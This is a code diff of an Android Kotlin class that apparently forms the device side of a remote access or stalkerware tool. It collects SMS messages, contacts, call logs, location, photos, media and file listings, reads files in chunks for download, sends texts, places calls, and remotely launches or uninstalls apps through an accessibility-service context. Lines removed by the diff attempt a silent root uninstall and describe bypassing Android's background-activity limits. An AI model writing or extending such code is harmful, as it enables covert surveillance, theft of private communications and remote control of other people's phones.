@@ -53,6 +53,7 @@ class TelephonyAndLocationManager(private val context: Context) {
                     }
                     onLocationUpdated?.invoke(json)
                 }
+
                 @Deprecated("Deprecated in Java")
                 override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                 override fun onProviderEnabled(provider: String) {}
@@ -73,10 +74,12 @@ class TelephonyAndLocationManager(private val context: Context) {
     // --- Phase 1: Step 1.2 Remote App Launch & Uninstall ---
     fun launchApp(packageName: String): Boolean {
         return try {
-            val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
+            val pm = context.packageManager
+            val launchIntent = pm.getLaunchIntentForPackage(packageName)
             if (launchIntent != null) {
-                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                context.startActivity(launchIntent)
+                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
+                val targetContext = RemoteInputService.instance ?: context
+                targetContext.startActivity(launchIntent)
                 true
             } else {
                 false
@@ -88,43 +91,31 @@ class TelephonyAndLocationManager(private val context: Context) {
     }
 
     fun requestUninstallApp(packageName: String): Boolean {
-        // 1. Root check (instant silent uninstall if phone is rooted)
-        try {
-            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm uninstall $packageName"))
-            if (process.waitFor() == 0) return true
-        } catch (e: Exception) {}
-
-        // 2. Official Android System PackageInstaller API (Bypasses background activity launch restrictions)
-        try {
-            val intent = Intent("com.example.localutility.UNINSTALL_RESULT")
-            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
-            } else {
-                PendingIntent.FLAG_UPDATE_CURRENT
-            }
-            val pendingIntent = PendingIntent.getBroadcast(context, 0, intent, flags)
-            context.packageManager.packageInstaller.uninstall(packageName, pendingIntent.intentSender)
-            return true
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-
-        // 3. Launch via AccessibilityService Context (Exempt from Android 10+ background activity restrictions)
-        try {
-            val serviceContext = RemoteInputService.instance ?: context
+        return try {
             val intent = Intent(Intent.ACTION_DELETE).apply {
                 data = Uri.fromParts("package", packageName, null)
                 putExtra(Intent.EXTRA_RETURN_RESULT, true)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            serviceContext.startActivity(intent)
-            return true
+            val targetContext = RemoteInputService.instance ?: context
+            targetContext.startActivity(intent)
+            true
         } catch (e: Exception) {
             e.printStackTrace()
+            try {
+                val settingsIntent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.fromParts("package", packageName, null)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                val targetContext = RemoteInputService.instance ?: context
+                targetContext.startActivity(settingsIntent)
+                true
+            } catch (e2: Exception) {
+                e2.printStackTrace()
+                false
+            }
         }
-
-        return false
     }
 
     // --- Target 7A: Remote Audio Tracks Discovery ---
@@ -170,10 +161,10 @@ class TelephonyAndLocationManager(private val context: Context) {
                         val track = JSONObject().apply {
                             put("title", it.getString(titleIdx) ?: "Unknown Title")
                             put("artist", it.getString(artistIdx) ?: "Unknown Artist")
+                            put("name", it.getString(nameIdx) ?: File(path).name)
                             put("duration", durationFormatted)
                             put("path", path)
                             put("size", it.getLong(sizeIdx))
-                            put("fileName", it.getString(nameIdx) ?: File(path).name)
                         }
                         array.put(track)
                         count++
@@ -204,7 +195,7 @@ class TelephonyAndLocationManager(private val context: Context) {
                 projection,
                 null,
                 null,
-                "${MediaStore.Video.Media.DATE_MODIFIED} DESC"
+                "${MediaStore.Video.Media.DATE_ADDED} DESC"
             )
 
             cursor?.use {
@@ -223,14 +214,14 @@ class TelephonyAndLocationManager(private val context: Context) {
                         val seconds = (durationMs / 1000) % 60
                         val durationFormatted = String.format("%02d:%02d", minutes, seconds)
 
-                        val video = JSONObject().apply {
+                        val track = JSONObject().apply {
                             put("title", it.getString(titleIdx) ?: "Unknown Video")
+                            put("name", it.getString(nameIdx) ?: File(path).name)
                             put("duration", durationFormatted)
                             put("path", path)
                             put("size", it.getLong(sizeIdx))
-                            put("fileName", it.getString(nameIdx) ?: File(path).name)
                         }
-                        array.put(video)
+                        array.put(track)
                         count++
                     }
                 }
@@ -241,7 +232,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
-    // --- Target 1: Chunked Download ---
+    // --- Target 2: Chunked Download ---
     fun readFileChunk(filePath: String, offset: Long, chunkSize: Int = 48 * 1024): JSONObject {
         val json = JSONObject()
         val file = File(filePath)
@@ -278,7 +269,7 @@ class TelephonyAndLocationManager(private val context: Context) {
             if (!dir.exists()) dir.mkdirs()
             val file = File(dir, fileName)
 
-            val mode = if (isFirst) "rw" else "rw"
+            val mode = "rw"
             RandomAccessFile(file, mode).use { raf ->
                 if (isFirst) {
                     raf.setLength(0)
@@ -305,16 +296,17 @@ class TelephonyAndLocationManager(private val context: Context) {
         val filesArray = JSONArray()
         val list = targetDir.listFiles()
         if (list != null) {
-            val sortedList = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
-            for (f in sortedList) {
-                val fObj = JSONObject().apply {
+            list.sortBy { !it.isDirectory }
+            for (f in list) {
+                if (f.name.startsWith(".")) continue
+                val fileObj = JSONObject().apply {
                     put("name", f.name)
                     put("path", f.absolutePath)
                     put("isDirectory", f.isDirectory)
-                    put("size", if (f.isDirectory) 0 else f.length())
+                    put("size", if (f.isFile) f.length() else 0L)
                     put("lastModified", f.lastModified())
                 }
-                filesArray.put(fObj)
+                filesArray.put(fileObj)
             }
         }
         result.put("files", filesArray)
@@ -348,30 +340,28 @@ class TelephonyAndLocationManager(private val context: Context) {
                 while (it.moveToNext() && count < 60) {
                     val path = it.getString(dataCol)
                     if (path != null && File(path).exists()) {
-                        val photo = JSONObject().apply {
-                            put("name", it.getString(nameCol) ?: "photo.jpg")
+                        val obj = JSONObject().apply {
+                            put("name", it.getString(nameCol) ?: File(path).name)
                             put("path", path)
-                            put("date", it.getLong(dateCol) * 1000)
+                            put("date", it.getLong(dateCol))
                             put("size", it.getLong(sizeCol))
                         }
-                        array.put(photo)
+                        array.put(obj)
                         count++
                     }
                 }
             }
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
+        } catch (e: Exception) { e.printStackTrace() }
         return array
     }
 
-    @SuppressLint("MissingPermission")
     fun getLocation(): JSONObject {
         val json = JSONObject().apply { put("type", "LOCATION") }
         try {
             val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                 ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                ?: lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
             if (loc != null) {
                 json.put("lat", loc.latitude)
                 json.put("lng", loc.longitude)
@@ -392,14 +382,17 @@ class TelephonyAndLocationManager(private val context: Context) {
             val uri = Uri.parse("content://sms")
             val cursor = context.contentResolver.query(uri, null, null, null, "date DESC LIMIT 50")
             cursor?.use {
-                val addressIdx = it.getColumnIndex("address")
-                val bodyIdx = it.getColumnIndex("body")
-                val typeIdx = it.getColumnIndex("type")
+                val addressCol = it.getColumnIndex("address")
+                val bodyCol = it.getColumnIndex("body")
+                val dateCol = it.getColumnIndex("date")
+                val typeCol = it.getColumnIndex("type")
+
                 while (it.moveToNext()) {
                     val obj = JSONObject().apply {
-                        put("address", if (addressIdx != -1) it.getString(addressIdx) else "Unknown")
-                        put("body", if (bodyIdx != -1) it.getString(bodyIdx) else "")
-                        put("type", if (typeIdx != -1 && it.getInt(typeIdx) == 1) "inbox" else "sent")
+                        put("address", if (addressCol != -1) it.getString(addressCol) else "Unknown")
+                        put("body", if (bodyCol != -1) it.getString(bodyCol) else "")
+                        put("date", if (dateCol != -1) it.getLong(dateCol) else 0L)
+                        put("type", if (typeCol != -1) it.getInt(typeCol) else 1)
                     }
                     array.put(obj)
                 }
@@ -416,7 +409,12 @@ class TelephonyAndLocationManager(private val context: Context) {
                 @Suppress("DEPRECATION")
                 SmsManager.getDefault()
             }
-            smsManager.sendTextMessage(to, null, message, null, null)
+            val parts = smsManager.divideMessage(message)
+            if (parts.size > 1) {
+                smsManager.sendMultipartTextMessage(to, null, parts, null, null)
+            } else {
+                smsManager.sendTextMessage(to, null, message, null, null)
+            }
             true
         } catch (e: Exception) { false }
     }
@@ -427,32 +425,30 @@ class TelephonyAndLocationManager(private val context: Context) {
             val cursor = context.contentResolver.query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
-                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
+                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 200"
             )
             cursor?.use {
                 val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                 val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                var count = 0
-                while (it.moveToNext() && count < 200) {
+                while (it.moveToNext()) {
                     val obj = JSONObject().apply {
                         put("name", if (nameIdx != -1) it.getString(nameIdx) else "Unknown")
-                        put("number", if (numIdx != -1) it.getString(numIdx) else "")
+                        put("number", if (numIdx != -1) it.getString(numIdx) else "Unknown")
                     }
                     array.put(obj)
-                    count++
                 }
             }
         } catch (e: Exception) { e.printStackTrace() }
         return array
     }
 
-    @SuppressLint("MissingPermission")
     fun makeCall(number: String) {
         try {
             val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
-            context.startActivity(intent)
+            val targetContext = RemoteInputService.instance ?: context
+            targetContext.startActivity(intent)
         } catch (e: Exception) { e.printStackTrace() }
     }
 
@@ -461,8 +457,16 @@ class TelephonyAndLocationManager(private val context: Context) {
         try {
             val cursor = context.contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
-                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
-                null, null, "${CallLog.Calls.DATE} DESC LIMIT 100"
+                arrayOf(
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION
+                ),
+                null,
+                null,
+                "${CallLog.Calls.DATE} DESC"
             )
             cursor?.use {
                 val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
@@ -470,26 +474,32 @@ class TelephonyAndLocationManager(private val context: Context) {
                 val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                 val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                 val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
-                while (it.moveToNext()) {
+                var count = 0
+                while (it.moveToNext() && count < 100) {
+                    count++
                     val typeStr = when (if (typeIdx != -1) it.getInt(typeIdx) else 0) {
                         CallLog.Calls.INCOMING_TYPE -> "Incoming"
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                         CallLog.Calls.MISSED_TYPE -> "Missed"
                         else -> "Other"
                     }
-                    val durSec = if (durIdx != -1) it.getLong(durIdx) else 0
+                    val durSec = if (durIdx != -1) it.getLong(durIdx) else 0L
                     val durFormatted = String.format("%02d:%02d", durSec / 60, durSec % 60)
+                    val rawNum = if (numIdx != -1) it.getString(numIdx) ?: "Unknown" else "Unknown"
+                    val rawName = if (nameIdx != -1 && it.getString(nameIdx) != null) it.getString(nameIdx) else rawNum
                     val obj = JSONObject().apply {
-                        put("number", if (numIdx != -1) it.getString(numIdx) else "Unknown")
-                        put("name", if (nameIdx != -1 && it.getString(nameIdx) != null) it.getString(nameIdx) else "Unknown")
+                        put("number", rawNum)
+                        put("name", rawName)
                         put("type", typeStr)
-                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0)
+                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                         put("duration", durFormatted)
                     }
                     array.put(obj)
                 }
             }
-        } catch (e: Exception) { e.printStackTrace() }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
         return array
     }
 
@@ -532,19 +542,9 @@ class TelephonyAndLocationManager(private val context: Context) {
             val stat = StatFs(Environment.getDataDirectory().path)
             val bytesAvailable = stat.blockSizeLong * stat.availableBlocksLong
             val totalBytes = stat.blockSizeLong * stat.blockCountLong
-            val usedBytes = totalBytes - bytesAvailable
-
-            val totalGB = String.format("%.1f GB", totalBytes / (1024.0 * 1024 * 1024))
-            val usedGB = String.format("%.1f GB", usedBytes / (1024.0 * 1024 * 1024))
-            val freeGB = String.format("%.1f GB", bytesAvailable / (1024.0 * 1024 * 1024))
-            val usedPercent = ((usedBytes.toDouble() / totalBytes) * 100).toInt()
-
-            json.put("totalGB", totalGB)
-            json.put("usedGB", usedGB)
-            json.put("freeGB", freeGB)
-            json.put("usedPercent", usedPercent)
+            json.put("freeBytes", bytesAvailable)
+            json.put("totalBytes", totalBytes)
         } catch (e: Exception) { e.printStackTrace() }
         return json
     }
 }
-
